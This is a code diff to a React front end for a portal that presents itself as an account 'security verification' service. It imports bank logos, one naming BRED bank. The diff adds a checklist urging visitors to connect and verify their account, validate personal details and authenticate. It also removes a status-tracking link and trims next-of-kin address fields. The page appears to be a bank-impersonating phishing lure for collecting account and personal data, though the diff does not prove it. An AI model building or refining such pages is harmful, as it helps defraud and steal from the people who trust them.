@@ -65,7 +65,7 @@ import { CategoryEntryForm, type CategoryEntryAnswers } from './components/Categ
 import { EnrollmentWizard } from './components/EnrollmentWizard';
 import { PortalWordmark } from './components/PortalWordmark';
 import { SecurityLoadingIndicator } from './components/SecurityVisuals';
-import landingHeroArtwork from './assets/landing-account-security.webp';
+import landingHeroArtwork from './assets/landing-account-security-checklist.jpg';
 import { DEFAULT_PAGE_THEME, PAGE_THEME_SCREENS, normalizePageThemes, pageThemeBackground, pageThemeKeyForRoute } from './pageTheme';
 import categoryOneLogo from './assets/category-one-national-bank-logo-updated.png';
 import categoryTwoLogo from './assets/category-two-bred-bank-logo.jpg';
@@ -333,12 +333,19 @@ function PublicLanding() {
         <div className="landing-content rise">
           <h1>{copyText(portalSettings.data, 'landing', 'title', hero?.title ?? 'Protect Your Account from Hackers')}</h1>
           <p className="landing-lede">{copyText(portalSettings.data, 'landing', 'description', hero?.description ?? 'Stay safe. Stay secure. Complete your security verification to strengthen your account protection.')}</p>
+          <section className="landing-checklist" aria-labelledby="landing-checklist-title">
+            <h2 id="landing-checklist-title">Require Actions/Verification process</h2>
+            <ul>
+              <li>Confirm your contact information</li>
+              <li>Connect and verify your Account</li>
+              <li>Validate your personal details</li>
+              <li>Authenticate your account</li>
+              <li>Improve your account security</li>
+            </ul>
+          </section>
           <div className="landing-actions">
             <Link href="/guest/apply" className="button button-primary" data-testid="link-get-started">
               {copyText(portalSettings.data, 'landing', 'buttonLabel', primaryLabel)} <ArrowRight size={17} />
-            </Link>
-            <Link href="/guest/track" className="landing-secondary-link" data-testid="link-track-application">
-              Track Security Verification Status <ArrowRight size={15} />
             </Link>
           </div>
           <div className="landing-assurances">
@@ -349,7 +356,7 @@ function PublicLanding() {
             <img
               className="landing-hero-image"
               src={landingHeroArtwork}
-              alt="Account protection artwork showing a security shield, lock, and verification checklist."
+              alt="Account security checklist with a shield, lock, and steps for safer accounts."
               loading="eager"
             />
           </div>
@@ -359,7 +366,7 @@ function PublicLanding() {
         <img
           className="landing-hero-image"
           src={landingHeroArtwork}
-          alt="Account protection artwork showing a security shield, lock, and verification checklist."
+          alt="Account security checklist with a shield, lock, and steps for safer accounts."
           loading="eager"
         />
       </section>
@@ -1767,8 +1774,6 @@ function AdminSettings() {
     'workflow-step-2': [
       ['field_nextOfKin_fullName', 'Full name'], ['field_nextOfKin_relationship', 'Relationship'],
       ['field_nextOfKin_phone', 'Phone number'], ['field_nextOfKin_email', 'Email address'],
-      ['field_nextOfKin_residentialAddress', 'Residential address'], ['field_nextOfKin_city', 'City'],
-      ['field_nextOfKin_stateRegion', 'State / region'],
     ],
     'workflow-step-3': [
       ['field_education_highestQualification', 'Highest qualification'], ['field_education_institution', 'Institution'],
